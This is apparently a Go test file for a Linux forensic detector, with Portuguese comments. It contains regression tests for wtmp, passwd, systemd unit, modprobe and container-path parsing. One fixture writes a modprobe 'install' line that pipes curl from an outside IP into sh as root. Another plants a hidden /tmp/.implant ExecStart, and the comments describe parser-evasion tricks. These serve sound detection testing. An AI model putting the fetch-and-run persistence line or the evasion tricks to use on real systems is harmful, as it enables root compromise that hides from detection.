package facts

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/env"
)

// Os testes desta rodada de conserto. Cada um trava UM defeito que estava vivo,
// e o comentário diz o que ele produzia — sem isso o teste vira ritual, e daqui
// a seis meses alguém "simplifica" o conserto de volta.

// Um wtmp truncado NÃO pode marcar a testemunha de histórico lido.
//
// lerUtmp declarava a lacuna ("o arquivo NÃO foi interpretado") e devolvia
// true. O resultado era f.Logins vazio COM HistoricoDeLoginLido ligado, que
// atravessa o guarda de antiforense.wtmp_cleared e produz o CRITICAL
// irreversível de "o histórico foi zerado" a partir de um arquivo que ninguém
// leu.
func TestWtmpTruncadoNaoViraTestemunhaDeHistoricoLido(t *testing.T) {
	dir := t.TempDir()
	wtmp := filepath.Join(dir, "wtmp")
	// 500 bytes: não é múltiplo de 384 nem de 400.
	if err := os.WriteFile(wtmp, make([]byte, 500), 0o600); err != nil {
		t.Fatal(err)
	}

	f := &Facts{}
	e := &env.Env{}
	if lerUtmp(f, e, wtmp, false, false) {
		t.Error("wtmp de tamanho não interpretável devolveu TRUE: a testemunha " +
			"de histórico lido fica ligada sobre um arquivo que não foi lido, e " +
			"antiforense.wtmp_cleared passa a acusar histórico zerado")
	}
	if len(f.PersistDenied["login"]) == 0 {
		t.Error("o tamanho não interpretável precisa declarar a lacuna")
	}
}

// A musl usa registro de 400 bytes em QUALQUER arquitetura, inclusive x86_64.
//
// A build tag decidia só pela arquitetura e fixava 384 em amd64/386. Em Alpine
// x86_64, todo wtmp cujo tamanho divide os dois (múltiplo de 9600) era lido com
// o passo errado: usuário vindo do meio de outro campo e timestamp zero, sem
// lacuna nenhuma declarada.
func TestNativoDeUtmpSegueALibcENaoSoAArquitetura(t *testing.T) {
	if got := nativoDeUtmp("musl"); got != tamUtmp64 {
		t.Errorf("musl: nativo=%d, queria %d — o registro da musl tem 400 bytes "+
			"em qualquer arquitetura", got, tamUtmp64)
	}
	if got := nativoDeUtmp("glibc"); got != tamanhoNativoDeUtmp {
		t.Errorf("glibc: nativo=%d, queria o da arquitetura (%d)", got, tamanhoNativoDeUtmp)
	}

	// 9600 = 25 registros de 384 E 24 de 400: é o desempate que decide.
	if got, ok := tamanhoDoRegistroCom(9600, nativoDeUtmp("musl")); !ok || got != tamUtmp64 {
		t.Errorf("9600 bytes em musl: %d (ok=%v), queria %d", got, ok, tamUtmp64)
	}
}

// Linha COMENTADA do /etc/passwd não é conta.
//
// Comentar a linha é a forma clássica de desabilitar um acesso. Sem o guarda,
// ela virava Account{Name: "#deploy"} — um nome que nunca está no shadow, logo
// SemShadow=true, logo priv.account_no_shadow CRITICAL sobre uma conta que não
// existe (e SevCritical quando o UID comentado é 0).
func TestLinhaComentadaDoPasswdNaoViraConta(t *testing.T) {
	dir := t.TempDir()
	etc := filepath.Join(dir, "etc")
	if err := os.MkdirAll(etc, 0o755); err != nil {
		t.Fatal(err)
	}
	escreve := func(nome, conteudo string) {
		if err := os.WriteFile(filepath.Join(etc, nome), []byte(conteudo), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	escreve("passwd", "root:x:0:0::/root:/bin/bash\n"+
		"#deploy:x:0:0::/home/deploy:/bin/bash\n"+
		"joana:x:1000:1000::/home/joana:/bin/bash\n")
	escreve("shadow", "root:$6$abc:1::::::\njoana:$6$def:1::::::\n")

	f := &Facts{}
	e := env.Probe(env.Options{Root: dir})
	defer e.Close()
	collectUsers(f, e)

	for _, a := range f.Accounts {
		if strings.HasPrefix(a.Name, "#") {
			t.Errorf("a linha comentada virou conta %q (uid=%d, SemShadow=%v): "+
				"priv.account_no_shadow acusa uma conta que não existe",
				a.Name, a.UID, a.SemShadow)
		}
	}
}

// O `.include` de unit é EXPANDIDO, e a falha de expandir vira lacuna.
//
// O parser só aceitava linha com `=`, e `.include /caminho` caía no continue —
// sem lacuna. É o idioma documentado de override no systemd 219 (RHEL/CentOS 7,
// SLES 12): o arquivo de /etc vence a precedência, a unit de vendor vira
// Shadowed, e a efetiva saía com Exec VAZIO. O binário não entrava em
// candidatosDePropriedade, não era hasheado, não passava por check de startup, e
// a cobertura saía COMPLETA.
func TestIncludeDeUnitEhExpandido(t *testing.T) {
	dir := t.TempDir()
	base := filepath.Join(dir, "base.service")
	if err := os.WriteFile(base,
		[]byte("[Service]\nExecStart=/usr/sbin/nginx\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	unit := filepath.Join(dir, "nginx.service")
	if err := os.WriteFile(unit,
		[]byte(".include "+base+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	f := &Facts{}
	e := &env.Env{}
	u := parseUnitFile(f, e, unit, "system", "service", false)
	if len(u.Exec) == 0 {
		t.Fatal("o `.include` não foi expandido: a unit efetiva saiu com Exec " +
			"vazio, e vazio ali significa 'esta unit não executa nada'")
	}
	if !strings.Contains(u.Exec[0].Cmd, "nginx") {
		t.Errorf("Exec[0]=%q, queria o ExecStart do arquivo incluído", u.Exec[0].Cmd)
	}
}

// O `.include` que NÃO abre precisa virar lacuna, nunca silêncio.
func TestIncludeDeUnitIlegivelViraLacuna(t *testing.T) {
	dir := t.TempDir()
	unit := filepath.Join(dir, "x.service")
	if err := os.WriteFile(unit,
		[]byte(".include /nao/existe/em/lugar/nenhum.conf\n[Service]\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	f := &Facts{}
	e := &env.Env{}
	parseUnitFile(f, e, unit, "system", "service", false)
	if len(f.PersistDenied["unit"]) == 0 {
		t.Error("um `.include` que não pôde ser lido saiu SEM lacuna: as " +
			"diretivas que ele traria não foram avaliadas, e ninguém fica sabendo")
	}
}

// Continuação por `\` não pode truncar o comando do modprobe.
//
// `install mod /bin/sh -c '…' \` com o resto na linha seguinte deixava Cmd
// truncado em `\` — e soChamaModprobe aceita `\` como nome de módulo, porque não
// contém `/`, e devolve true. O resultado era persist.modprobe_install
// SUPRIMINDO o achado enquanto o kmod executava a linha inteira como root.
func TestContinuacaoDeLinhaNaoTruncaOComandoDoModprobe(t *testing.T) {
	dir := t.TempDir()
	conf := filepath.Join(dir, "evil.conf")
	if err := os.WriteFile(conf,
		[]byte("install dummy /bin/sh \\\n-c 'curl http://203.0.113.7/x | sh'\n"),
		0o644); err != nil {
		t.Fatal(err)
	}

	f := &Facts{}
	e := &env.Env{}
	lerModprobe(f, e, conf)
	if len(f.Modules) != 1 {
		t.Fatalf("esperava 1 diretiva, veio %d: %+v", len(f.Modules), f.Modules)
	}
	cmd := f.Modules[0].Cmd
	if strings.HasSuffix(strings.TrimSpace(cmd), `\`) {
		t.Errorf("Cmd=%q termina em barra invertida: a continuação truncou o "+
			"comando no ponto que o torna invisível para o check", cmd)
	}
	if !strings.Contains(cmd, "curl") {
		t.Errorf("Cmd=%q perdeu a continuação — o que o kmod executa como root "+
			"não entrou no fato", cmd)
	}
}

// Um binário do k3s sob /var/lib/rancher NÃO é camada de imagem.
//
// raizesDeImagem casava o prefixo, e o k3s guarda ali os binários DO HOST:
// /var/lib/rancher/k3s/data/<hash>/bin/containerd roda sob k3s.service, com
// cgroup de host. A regra "exe em camada de imagem + cgroup do host" disparava
// CRITICAL — "não tem caminho legítimo comum" — em TODO nó k3s e RKE2.
func TestBinarioDoHostSobRancherNaoEhCamadaDeImagem(t *testing.T) {
	casos := []struct {
		caminho string
		quer    bool
		porque  string
	}{
		{"/var/lib/rancher/k3s/data/abc123/bin/containerd", false,
			"binário do HOST entregue pelo k3s"},
		{"/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/12/fs/usr/sbin/nginx", true,
			"camada de imagem de verdade, sob a mesma raiz"},
		{"/var/lib/docker/overlay2/9f3c/diff/usr/sbin/nginx", true,
			"camada de imagem clássica"},
		{"/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256/abc", false,
			"content store, não rootfs"},
		{"/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/5/fs/bin/sh", true,
			"snapshot do containerd É camada de imagem"},
		{"/var/lib/rancher/k3s/server/fs/bin/algo", false,
			"`/fs/` sozinho é genérico demais para provar camada"},
		{"/usr/sbin/nginx", false, "caminho comum do host"},
	}
	for _, c := range casos {
		if got := EmCamadaDeImagem(c.caminho); got != c.quer {
			t.Errorf("EmCamadaDeImagem(%q)=%v, queria %v — %s",
				c.caminho, got, c.quer, c.porque)
		}
	}
}

// Cgroup ilegível precisa ser DISTINGUÍVEL de cgroup do host.
//
// Cgroup=="" tinha dois significados, e o primeiro é premissa de acusação:
// proc.container_boundary chama de escape de contêiner o exe em camada de
// imagem cujo cgroup é do host.
func TestCgroupIlegivelEhMarcadoEmVezDeVirarHost(t *testing.T) {
	p := &Process{PID: 999999} // PID que não existe: o open falha
	readCgroup(p)
	if !p.CgroupDesconhecido {
		t.Error("um /proc/<pid>/cgroup que não abriu deixou CgroupDesconhecido " +
			"em false: o processo passa a contar como 'está no host', que é " +
			"metade da premissa do CRITICAL de escape de contêiner")
	}
}

// A seção corrente sobrevive ao `.include`, como no systemd.
//
// O systemd parseia o incluído com estado de seção próprio e volta para onde
// estava. Uma emenda textual crua faz o `[Unit]` do arquivo incluído valer para
// o resto do arquivo que o incluiu — e aí um ExecStart depois do include seria
// descartado como se estivesse em [Unit]. Falso NEGATIVO, barato de escrever
// para quem planta.
func TestSecaoSobreviveAoIncludeDeUnit(t *testing.T) {
	dir := t.TempDir()
	base := filepath.Join(dir, "base.conf")
	if err := os.WriteFile(base,
		[]byte("[Unit]\nDescription=base\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	unit := filepath.Join(dir, "x.service")
	if err := os.WriteFile(unit,
		[]byte("[Service]\n.include "+base+"\nExecStart=/tmp/.implant\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	f := &Facts{}
	e := &env.Env{}
	u := parseUnitFile(f, e, unit, "system", "service", false)
	if len(u.Exec) == 0 {
		t.Fatal("o ExecStart DEPOIS do include sumiu: a seção do arquivo " +
			"incluído vazou e o parser o descartou como se estivesse em [Unit]")
	}
	if !strings.Contains(u.Exec[0].Cmd, "/tmp/.implant") {
		t.Errorf("Exec[0]=%q, queria o ExecStart que vem depois do include", u.Exec[0].Cmd)
	}
}
